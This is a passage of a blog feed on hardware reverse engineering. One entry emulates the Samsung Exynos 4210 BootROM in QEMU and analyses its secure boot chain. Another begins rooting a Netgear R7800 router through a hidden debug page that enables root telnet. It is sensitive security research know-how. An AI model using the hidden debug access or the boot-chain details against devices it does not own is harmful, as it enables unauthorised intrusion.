  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_write&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;338&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;ACE_AES_KEY7&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mh"&gt;0x0298&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="mh"&gt;0x230ce305&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_write&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;338&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;ACE_AES_KEY8&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mh"&gt;0x029c&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="mh"&gt;0xcaad75d2&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_write&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;338&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;ACE_AES_IV1&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mh"&gt;0x0230&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="mh"&gt;0xee1c2939&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_write&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;338&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;ACE_AES_IV2&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mh"&gt;0x0234&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="mh"&gt;0x6be93160&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_write&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;338&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;ACE_AES_IV3&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mh"&gt;0x0238&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="mh"&gt;0xd8bbf993&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_write&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;338&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;ACE_AES_IV4&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mh"&gt;0x023c&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="mh"&gt;0x29b98fe8&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_read&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;315&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;ACE_FC_INTPEND&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x000c&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="mh"&gt;0x0000&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_FCINTPEND&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;227&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;QEMU&lt;/span&gt; &lt;span class="nl"&gt;ACE&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;FCINTPEND&lt;/span&gt; &lt;span class="n"&gt;triggered&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;Set input &amp;amp; output buffer addresses (0x2021410), set buffer size (0x1bf0), and poll decryption process status (&lt;strong&gt;ACE_FC_INTPEND&lt;/strong&gt; register):&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_write&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;338&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;ACE_FC_BRDMAS&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mh"&gt;0x0020&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="mh"&gt;0x2021410&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_write&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;338&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;ACE_FC_BTDMAS&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mh"&gt;0x0030&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="mh"&gt;0x2021410&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_write&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;338&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;ACE_FC_BTDMAL&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mh"&gt;0x0034&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="mh"&gt;0x1bf0&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_write&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;338&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;ACE_FC_BRDMAL&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mh"&gt;0x0024&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="mh"&gt;0x1bf0&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_read&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;315&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;ACE_FC_INTPEND&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x000c&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="mh"&gt;0x0000&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_FCINTPEND&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;227&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;QEMU&lt;/span&gt; &lt;span class="nl"&gt;ACE&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;FCINTPEND&lt;/span&gt; &lt;span class="n"&gt;triggered&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_FCINTPEND&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;235&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;QEMU&lt;/span&gt; &lt;span class="nl"&gt;ACE&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;AES_control&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0xe8b&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;FCBRDMAS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x2021410&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;FCBRDMAS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x1bf0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;FCBRDMAS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x2021410&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;FCBRDMAS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x1bf0&lt;/span&gt;
  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;exynos4210_ace_write&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;338&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;   &lt;span class="n"&gt;ACE_FC_INTPEND&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mh"&gt;0x000c&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="mh"&gt;0x0004&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The log shows that 0x1bf0 bytes of data at address 0x2021410 are decrypted (&lt;strong&gt;ACE_AES_CONTROL[0]&lt;/strong&gt; bit) using AES-CBC mode (&lt;strong&gt;ACE_AES_CONTROL[2:1]&lt;/strong&gt; bits).&lt;/p&gt;
&lt;h2&gt;Minor fixes in SD/MMC Host controller&lt;/h2&gt;
&lt;p&gt;SD controller emulation is already fully supported by QEMU, however few minor differences causes BootROM to hang.&lt;/p&gt;
&lt;p&gt;First issue occurs when BootROM sends initialization command ACMD41 (SD_APP_OP_COND) multiple times. QEMU SD-card emulator only replies to the first attempt. &lt;a href="https://github.com/frederic/qemu-exynos-bootrom/commit/6f045949ee2fdec6248a8e438a38c212c2896927"&gt;Our patch&lt;/a&gt; ensures that SD-card always replies, even when SD-card state is already ready.&lt;/p&gt;
&lt;p&gt;Second issue is the lack of support for &lt;strong&gt;&lt;em&gt;SD Clock Enable&lt;/em&gt;&lt;/strong&gt; register in &lt;a href="https://www.sdcard.org/jp/developers/overview/host_controller/simple_spec/Simplified_SD_Host_Controller_Spec.pdf"&gt;Clock Control Register&lt;/a&gt;.
&lt;a href="https://github.com/frederic/qemu-exynos-bootrom/commit/9be5c9f2253dbc04ee690365f9e81eb1fbc00ee0"&gt;The patch&lt;/a&gt; implements it like defined in the &lt;a href="https://lists.gnu.org/archive/html/qemu-devel/2011-12/msg01271.html"&gt;original contribution&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Thanks to these changes, BootROM can perform SD operations. QEMU debug log shows that 0x2000 bytes are read at offset 0x200 :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;SD: sd_blk_read: addr = 0x00000200, len = 512
SD: sd_blk_read: addr = 0x00000400, len = 512
SD: sd_blk_read: addr = 0x00000600, len = 512
SD: sd_blk_read: addr = 0x00000800, len = 512
SD: sd_blk_read: addr = 0x00000a00, len = 512
SD: sd_blk_read: addr = 0x00000c00, len = 512
SD: sd_blk_read: addr = 0x00000e00, len = 512
SD: sd_blk_read: addr = 0x00001000, len = 512
SD: sd_blk_read: addr = 0x00001200, len = 512
SD: sd_blk_read: addr = 0x00001400, len = 512
SD: sd_blk_read: addr = 0x00001600, len = 512
SD: sd_blk_read: addr = 0x00001800, len = 512
SD: sd_blk_read: addr = 0x00001a00, len = 512
SD: sd_blk_read: addr = 0x00001c00, len = 512
SD: sd_blk_read: addr = 0x00001e00, len = 512
SD: sd_blk_read: addr = 0x00002000, len = 512
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;These read operations match with encrypted FWBL1 image in bootloader partition previously dumped.&lt;/p&gt;
&lt;h1&gt;Executing BootROM in QEMU&lt;/h1&gt;
&lt;p&gt;We compile our modified &lt;a href="https://github.com/frederic/qemu-exynos-bootrom"&gt;QEMU&lt;/a&gt; and run :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ qemu-system-arm -machine smdkc210 -cpu cortex-a9 -s -S -bios ./bootrom.bin  -sd ./mmc_boot.img
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;-machine : emulated machine&lt;/li&gt;
&lt;li&gt;-s : Shorthand for -gdb tcp::1234&lt;/li&gt;
&lt;li&gt;-S : Do not start CPU at startup&lt;/li&gt;
&lt;li&gt;-bios : BootROM image file&lt;/li&gt;
&lt;li&gt;-sd : SD-card image file (equivalent to internal eMMC memory). We specify the path of bootloader dumped previously.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;From static analysis, we know that main BootROM function ends by jumping to IRAM at address &lt;strong&gt;0x02021410&lt;/strong&gt;. We can also notice that AES decryption took place at the same address.
We attach GDB and set a breakpoint to this address :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Breakpoint&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x02021410&lt;/span&gt; &lt;span class="n"&gt;in&lt;/span&gt; &lt;span class="o"&gt;??&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;layout&lt;/span&gt; &lt;span class="k"&gt;asm&lt;/span&gt;
&lt;span class="n"&gt;B&lt;/span&gt;&lt;span class="o"&gt;+&amp;gt;&lt;/span&gt; &lt;span class="mh"&gt;0x2021410&lt;/span&gt;       &lt;span class="n"&gt;b&lt;/span&gt;      &lt;span class="mh"&gt;0x2021434&lt;/span&gt;
    &lt;span class="mh"&gt;0x2021414&lt;/span&gt;       &lt;span class="n"&gt;b&lt;/span&gt;      &lt;span class="mh"&gt;0x2021414&lt;/span&gt;
    &lt;span class="mh"&gt;0x2021418&lt;/span&gt;       &lt;span class="n"&gt;b&lt;/span&gt;      &lt;span class="mh"&gt;0x2021418&lt;/span&gt;
    &lt;span class="mh"&gt;0x202141c&lt;/span&gt;       &lt;span class="n"&gt;b&lt;/span&gt;      &lt;span class="mh"&gt;0x202141c&lt;/span&gt;
    &lt;span class="mh"&gt;0x2021420&lt;/span&gt;       &lt;span class="n"&gt;b&lt;/span&gt;      &lt;span class="mh"&gt;0x2021420&lt;/span&gt;
    &lt;span class="mh"&gt;0x2021424&lt;/span&gt;       &lt;span class="n"&gt;b&lt;/span&gt;      &lt;span class="mh"&gt;0x2021424&lt;/span&gt;
    &lt;span class="mh"&gt;0x2021428&lt;/span&gt;       &lt;span class="n"&gt;b&lt;/span&gt;      &lt;span class="mh"&gt;0x2021428&lt;/span&gt;
    &lt;span class="mh"&gt;0x202142c&lt;/span&gt;       &lt;span class="n"&gt;b&lt;/span&gt;      &lt;span class="mh"&gt;0x202142c&lt;/span&gt;
    &lt;span class="mh"&gt;0x2021430&lt;/span&gt;       &lt;span class="n"&gt;b&lt;/span&gt;      &lt;span class="mh"&gt;0x2021430&lt;/span&gt;
    &lt;span class="mh"&gt;0x2021434&lt;/span&gt;       &lt;span class="n"&gt;mrc&lt;/span&gt;    &lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cr1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cr0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;[...]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;GDB breaks at the exception vector table of decrypted FWBL1.&lt;/p&gt;
&lt;p&gt;After resuming execution, QEMU debug log shows that FWBL1 reads 0x4000 bytes from flash memory at address 0x2200 :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;SD: sd_blk_read: addr = 0x00002200, len = 512
SD: sd_blk_read: addr = 0x00002400, len = 512
[...]
SD: sd_blk_read: addr = 0x00005e00, len = 512
SD: sd_blk_read: addr = 0x00006000, len = 512
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;But that's another story since BootROM execution is already over.&lt;/p&gt;
&lt;h1&gt;Secure boot analysis&lt;/h1&gt;
&lt;p&gt;Secure boot process aims to assert the authenticity of all software components in boot chain.
The first component in the chain is called root of trust, and in our case it's the BootROM. It loads, authenticates and decrypts the next component called FWBL1, stored in flash memory.&lt;/p&gt;
&lt;p&gt;The footer of FWBL1 contains metadata structures that BootROM parses to perform authentication.
Fortunately, these structures are defined in &lt;a href="https://github.com/medicalwei/u-boot-odroidxu-hyp/blob/master/arch/arm/cpu/armv7/exynos/uboot_sb21.h"&gt;U-Boot source tree&lt;/a&gt; :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#define     SB20_MAX_SIGN_LEN       (2048/8)&lt;/span&gt;
&lt;span class="k"&gt;typedef&lt;/span&gt; &lt;span class="k"&gt;struct&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;SB20_RSAPubKey&lt;/span&gt;      &lt;span class="n"&gt;stage2PubKey&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt;         &lt;span class="n"&gt;code_SignedDataLen&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;       &lt;span class="n"&gt;code_SignedData&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;SB20_MAX_SIGN_LEN&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="n"&gt;SB20_PubKeyInfo&lt;/span&gt;     &lt;span class="n"&gt;pubKeyInfo&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;       &lt;span class="n"&gt;func_ptr_BaseAddr&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;128&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;       &lt;span class="n"&gt;reservedData&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;80&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="n"&gt;SB20_CONTEXT&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Field &lt;strong&gt;code_SignedData&lt;/strong&gt; is the RSA-2048 signature of payload (FWBL1 code).&lt;/p&gt;
&lt;p&gt;Then, &lt;strong&gt;pubKeyInfo&lt;/strong&gt; structure contains information required to verify this signature :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#define SB20_HMAC_SHA1_LEN          20&lt;/span&gt;
&lt;span class="k"&gt;typedef&lt;/span&gt; &lt;span class="k"&gt;struct&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;SB20_RSAPubKey&lt;/span&gt;      &lt;span class="n"&gt;rsaPubKey&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;       &lt;span class="n"&gt;signedData&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;SB20_HMAC_SHA1_LEN&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="n"&gt;SB20_PubKeyInfo&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;rsaPubKey&lt;/strong&gt; structure is the RSA public key, composed of modulus N and public exponent E.
&lt;strong&gt;signedData&lt;/strong&gt; is a HMAC of this key to ensure it hasn't been modified.&lt;/p&gt;
&lt;p&gt;So the authentication scenario of FWBL1 by BootROM is :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;verify HMAC of &lt;strong&gt;rsaPubKey&lt;/strong&gt; : &lt;strong&gt;signedData&lt;/strong&gt; == HMAC(&lt;strong&gt;Key&lt;/strong&gt;, &lt;strong&gt;rsaPubKey&lt;/strong&gt;)&lt;/li&gt;
&lt;li&gt;verify &lt;strong&gt;code_SignedData&lt;/strong&gt; signature using &lt;strong&gt;rsaPubKey&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Verifying HMAC value &lt;strong&gt;signedData&lt;/strong&gt; requires the same secret &lt;strong&gt;Key&lt;/strong&gt; that was used to generate it. However, static analysis reveals that &lt;strong&gt;Key&lt;/strong&gt; is not directly stored in device : it's in fact derived at runtime with a XOR operation applied to OTP value &lt;strong&gt;&lt;em&gt;OTP_key&lt;/em&gt;&lt;/strong&gt; and the HMAC &lt;strong&gt;signedData&lt;/strong&gt; itself :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Key&lt;/strong&gt; = &lt;strong&gt;signedData&lt;/strong&gt; ⊕ &lt;strong&gt;&lt;em&gt;OTP_key&lt;/em&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Since &lt;strong&gt;&lt;em&gt;OTP_key&lt;/em&gt;&lt;/strong&gt; is in read-only OTP memory, attacker cannot replace &lt;strong&gt;rsaPubKey&lt;/strong&gt; to forge a new signature, otherwise derivated &lt;strong&gt;Key&lt;/strong&gt; would be different and HMAC verification would fail.&lt;/p&gt;
&lt;p&gt;Finally, authenticated payload is decrypted using AES-CBC-128, with same &lt;strong&gt;Key&lt;/strong&gt; as the HMAC one (first 16 bytes only). IV is the SHA1 of &lt;strong&gt;rsaPubKey&lt;/strong&gt; (first 16 bytes).&lt;/p&gt;
&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;QEMU is able to run Exynos 4210 BootROM with &lt;strong&gt;&lt;em&gt;relatively&lt;/em&gt;&lt;/strong&gt; &lt;a href="https://github.com/frederic/qemu-exynos-bootrom"&gt;small code changes&lt;/a&gt; (~600 LoC). This project allows to debug BootROM dynamically with GDB. It has been helpful for analyzing secure boot mechanism that loads and authenticates the next stage from flash memory.&lt;/p&gt;</content><category term="arm"></category><category term="exynos"></category><category term="samsung"></category><category term="bootrom"></category><category term="qemu"></category><category term="emulation"></category><category term="bootloader"></category><category term="secureboot"></category></entry><entry><title>Netgear Nighthawk R7800 : add USB camera support to create a security webcam</title><link href="https://fredericb.info/2017/11/netgear-nighthawk-r7800-add-usb-camera-support-to-create-a-security-webcam.html" rel="alternate"></link><published>2017-11-22T00:00:00-08:00</published><updated>2017-11-22T00:00:00-08:00</updated><author><name>Frédéric</name></author><id>tag:fredericb.info,2017-11-22:/2017/11/netgear-nighthawk-r7800-add-usb-camera-support-to-create-a-security-webcam.html</id><summary type="html">&lt;p&gt;This article explains how to customize Nighthawk X4S firmware to add a security camera feature to this always-online &amp;amp; almost-always-idle device.
Alternative firmwares like &lt;a href="https://openwrt.org/"&gt;OpenWRT&lt;/a&gt; or &lt;a href="https://lede-project.org/"&gt;LEDE&lt;/a&gt; exist, but they don't fully support all stock features yet. So instead this approach is based on modified stock firmware.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Netgear Nighthawk X4S" src="https://fredericb.info/blog/r7800-custom/x4s.jpg"&gt;
&lt;img alt="Serious webcam" src="https://fredericb.info/blog/r7800-custom/webcam.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Main steps are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Customize …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;p&gt;This article explains how to customize Nighthawk X4S firmware to add a security camera feature to this always-online &amp;amp; almost-always-idle device.
Alternative firmwares like &lt;a href="https://openwrt.org/"&gt;OpenWRT&lt;/a&gt; or &lt;a href="https://lede-project.org/"&gt;LEDE&lt;/a&gt; exist, but they don't fully support all stock features yet. So instead this approach is based on modified stock firmware.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Netgear Nighthawk X4S" src="https://fredericb.info/blog/r7800-custom/x4s.jpg"&gt;
&lt;img alt="Serious webcam" src="https://fredericb.info/blog/r7800-custom/webcam.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Main steps are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Customize kernel to add USB video support (uvc, v4l2)&lt;/li&gt;
&lt;li&gt;Install additional software packages for motion detection&lt;/li&gt;
&lt;li&gt;Configure motion detection alerts&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;#YOLO&lt;/h1&gt;
&lt;p&gt;There's always a risk of bricking the device if something goes wrong. However, a &lt;a href="https://kb.netgear.com/22688/How-to-upload-firmware-to-a-NETGEAR-router-using-TFTP"&gt;recovery procedure via TFTP&lt;/a&gt; exists.&lt;/p&gt;
&lt;p&gt;Software downloads are performed over HTTP, due to client limitation on target side.&lt;/p&gt;
&lt;h1&gt;Hardware&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.netgear.com/home/products/networking/wifi-routers/R7800.aspx"&gt;Neatgear Nighthawk X4S router&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.aliexpress.com/item/Newest-Webcam-USB-12-Megapixel-High-Definition-Camera-Web-Cam-360-Degree-MIC-Clip-on-For/32659656232.html"&gt;random cheap USB webcam&lt;/a&gt; (don't buy that one, quality is terrible)&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;Root that firmware&lt;/h1&gt;
&lt;p&gt;I first thought that this step would be a pain, but then reminded the device manufacturer name. By grepping 'telnet' in the &lt;a href="https://www.netgear.com/support/product/r7800.aspx#download"&gt;firmware binary&lt;/a&gt;, we discover the existence of a debug page &lt;em&gt;/debug.htm&lt;/em&gt; , with telnet option:&lt;/p&gt;
&lt;p&gt;&lt;img alt="R7800 debug webpage" src="https://fredericb.info/blog/r7800-custom/r7800_debug_page.png" width="852px"&gt;&lt;/p&gt;
&lt;p&gt;Telnet access is protected with the same password as WebUI, and gives a root shell.&lt;/p&gt;
&lt;h1&gt;Backup all the things&lt;/h1&gt;
&lt;p&gt;Thanks to telnet access, we backup the original kernel partition on an external USB drive :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ telnet &lt;span class="m"&gt;192&lt;/span&gt;.168.1.1
Trying &lt;span class="m"&gt;192&lt;/span&gt;.168.1.1...
Connected to &lt;span class="m"&gt;192&lt;/span&gt;.168.1.1.
Escape character is &lt;span class="s1"&gt;&amp;#39;^]&amp;#39;&lt;/span&gt;.
